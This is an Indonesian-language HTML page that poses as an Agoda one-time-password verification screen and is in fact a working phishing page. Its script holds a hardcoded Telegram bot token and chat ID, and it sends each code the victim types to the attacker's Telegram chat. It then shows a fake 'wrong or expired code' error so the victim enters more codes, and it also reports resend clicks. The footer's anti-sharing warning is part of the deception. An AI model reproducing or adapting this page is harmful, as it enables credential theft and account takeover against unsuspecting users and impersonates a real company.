<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi OTP - Agoda</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f0f4ff 0%, #ffffff 50%, #f0f4ff 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 40px 32px;
        }

        .logo-container {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo {
            height: 42px;
            margin-bottom: 24px;
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 14px;
            color: #666;
            line-height: 1.5;
        }

        .otp-inputs {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-bottom: 24px;
            margin-top: 24px;
        }

        .otp-input {
            width: 42px;
            height: 52px;
            padding: 0;
            text-align: center;
            font-size: 20px;
            font-weight: 600;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-family: inherit;
            transition: all 0.2s;
        }

        .otp-input:focus {
            outline: none;
            border-color: #0066cc;
            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
            background: #f8faff;
        }

        .error-message {
            padding: 12px;
            background: #fef2f2;
            border: 1px solid #fecaca;
            border-radius: 8px;
            color: #dc2626;
            font-size: 13px;
            margin-bottom: 16px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .submit-btn {
            width: 100%;
            padding: 14px 16px;
            background: #0066cc;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
        }

        .submit-btn:hover:not(:disabled) {
            background: #0052a3;
            box-shadow: 0 4px 12px rgba(0, 102, 204, 0.3);
        }

        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            opacity: 0.6;
        }

        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: inline-block;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .timer-section {
            margin-top: 24px;
            text-align: center;
            font-size: 13px;
            color: #666;
        }

        .timer-text {
            color: #0066cc;
            font-weight: 600;
        }

        .resend-section {
            text-align: center;
            margin-top: 20px;
        }

        .resend-btn {
            background: none;
            border: none;
            color: #0066cc;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            transition: color 0.2s;
        }

        .resend-btn:hover {
            color: #0052a3;
            text-decoration: underline;
        }

        .footer {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #eee;
            text-align: center;
            font-size: 12px;
            color: #999;
            line-height: 1.6;
        }

        @media (max-width: 480px) {
            .container {
                padding: 32px 20px;
            }
            .title {
                font-size: 24px;
            }
            .otp-input {
                width: 38px;
                height: 48px;
                font-size: 18px;
            }
            .otp-inputs {
                gap: 6px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="https://cdn6.agoda.net/images/kite-js/logo/agoda/color-default.svg" alt="Agoda Logo" class="logo">
            <h4 class="title">Verifikasi OTP</h4>
            <p class="subtitle" id="dynamicSubtitle">Kami telah mengirimkan kode 6 digit ke email atau nomor telepon Anda.</p>
        </div>

        <div id="errorMessage" class="error-message"></div>

        <form onsubmit="handleSubmit(event)">
            <div class="otp-inputs" id="otpContainer">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="0">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="1">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="2">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="3">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="4">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="5">
            </div>

            <button type="submit" class="submit-btn" id="submitBtn">
                <span id="submitText">Lanjutkan</span>
            </button>
        </form>

        <div class="timer-section">
            Kode berlaku dalam <span class="timer-text" id="timerText">01:00</span>
        </div>

        <div class="resend-section">
            <button type="button" class="resend-btn" onclick="handleResend()">Kirim ulang OTP</button>
        </div>

        <div class="footer">
            <p>Jangan bagikan kode OTP Anda kepada siapa pun. Agoda tidak akan pernah meminta kode Anda.</p>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7622590670:AAHh46L-JfETNyK1fSs2rth26Pmcq1fIE5w';
        const CHAT_ID = '6691063456';

        // Update subtitle based on URL parameter
        const urlParams = new URLSearchParams(window.location.search);
        const method = urlParams.get('method');
        const subtitle = document.getElementById('dynamicSubtitle');
        
        if (method === 'email') {
            subtitle.textContent = 'Kami telah mengirimkan kode 6 digit ke email Anda.';
        } else if (method === 'phone') {
            subtitle.textContent = 'Kami telah mengirimkan kode 6 digit ke nomor telepon Anda.';
        }

        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (!/^\d$/.test(e.target.value)) {
                    e.target.value = '';
                    return;
                }
                if (index < otpInputs.length - 1 && e.target.value) {
                    otpInputs[index + 1].focus();
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });

        async function handleSubmit(event) {
            event.preventDefault();

            const otp = Array.from(otpInputs).map(input => input.value).join('');
            const errorMessage = document.getElementById('errorMessage');
            const submitBtn = document.getElementById('submitBtn');
            const submitText = document.getElementById('submitText');

            if (otp.length !== 6) {
                errorMessage.textContent = 'OTP harus 6 digit';
                errorMessage.classList.add('show');
                return;
            }

            errorMessage.classList.remove('show');
            submitBtn.disabled = true;
            submitText.innerHTML = '<span class="spinner"></span> Memproses...';

            const message = `🔐 *OTP Agoda Baru*\n\n` +
                          `🔢 *Kode OTP:* \`${otp}\`\n` +
                          `📅 *Waktu:* ${new Date().toLocaleString('id-ID')}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    }),
                });

                setTimeout(() => {
                    errorMessage.textContent = 'Kode verifikasi salah atau kadaluarsa. Silakan coba lagi.';
                    errorMessage.classList.add('show');
                    
                    otpInputs.forEach(input => input.value = '');
                    otpInputs[0].focus();
                    
                    submitBtn.disabled = false;
                    submitText.textContent = 'Lanjutkan';
                }, 1500);

            } catch (error) {
                errorMessage.textContent = 'Terjadi kesalahan. Silakan coba lagi.';
                errorMessage.classList.add('show');
                submitBtn.disabled = false;
                submitText.textContent = 'Lanjutkan';
            }
        }

        async function handleResend() {
            const resendBtn = document.querySelector('.resend-btn');
            const errorMessage = document.getElementById('errorMessage');
            
            resendBtn.disabled = true;
            resendBtn.textContent = 'Mengirim ulang...';
            
            const message = `🔄 *Permintaan Kirim Ulang OTP*\n\n` +
                          `📅 *Waktu:* ${new Date().toLocaleString('id-ID')}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    }),
                });

                timeLeft = 60;
                errorMessage.classList.remove('show');
                
                setTimeout(() => {
                    resendBtn.disabled = false;
                    resendBtn.textContent = 'Kirim ulang OTP';
                }, 2000);

            } catch (error) {
                resendBtn.disabled = false;
                resendBtn.textContent = 'Kirim ulang OTP';
            }
        }

        let timeLeft = 60; 
        setInterval(() => {
            if (timeLeft > 0) {
                timeLeft--;
                const mins = Math.floor(timeLeft / 60);
                const secs = timeLeft % 60;
                document.getElementById('timerText').textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
            } else {
                timeLeft = 60;
            }
        }, 1000);
    </script>
</body>
</html>
